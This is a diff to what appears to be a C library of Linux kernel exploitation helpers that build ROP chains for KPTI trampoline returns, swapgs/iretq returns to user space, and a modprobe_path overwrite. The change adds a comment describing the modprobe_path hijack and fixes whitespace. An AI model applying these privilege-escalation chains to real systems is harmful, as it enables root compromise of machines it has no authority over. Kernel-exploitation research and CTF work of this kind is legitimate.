@@ -71,7 +71,6 @@ size_t chain_kpti_trampoline(rop_buffer_t rop,
 
 
 /* ============= iretq ============= */
-
 size_t chain_swapgs_iretq(rop_buffer_t rop,
                         uintptr_t swapgs_pop_rbp_ret,
                         uintptr_t iretq,
@@ -95,6 +94,14 @@ size_t chain_swapgs_iretq(rop_buffer_t rop,
 }
 
 /* ============= modprobe ============= */
+
+/*
+ * Hijack modprobe_path called in call_modprobe()
+ * Predefine a faked modprobe_path
+ * Return to there
+ * After context switching from kernel to user space
+ *      e.g. KPTI trampoline
+ */
 size_t chain_modprobe_path(rop_buffer_t rop,
                         uintptr_t modprobe_path_addr,
                         const char *fake_modprobe_path,
@@ -103,8 +110,8 @@ size_t chain_modprobe_path(rop_buffer_t rop,
                         rop_buffer_t mov_deref_rdi_rax_rop)
 {
     size_t i = 0;
- 	
-	uint64_t le_path = encode_string_as_le64(fake_modprobe_path);
+    
+    uint64_t le_path = encode_string_as_le64(fake_modprobe_path);
 
     PUSH_ROP(rop, i, pop_rax_ret);
     PUSH_ROP(rop, i, le_path);
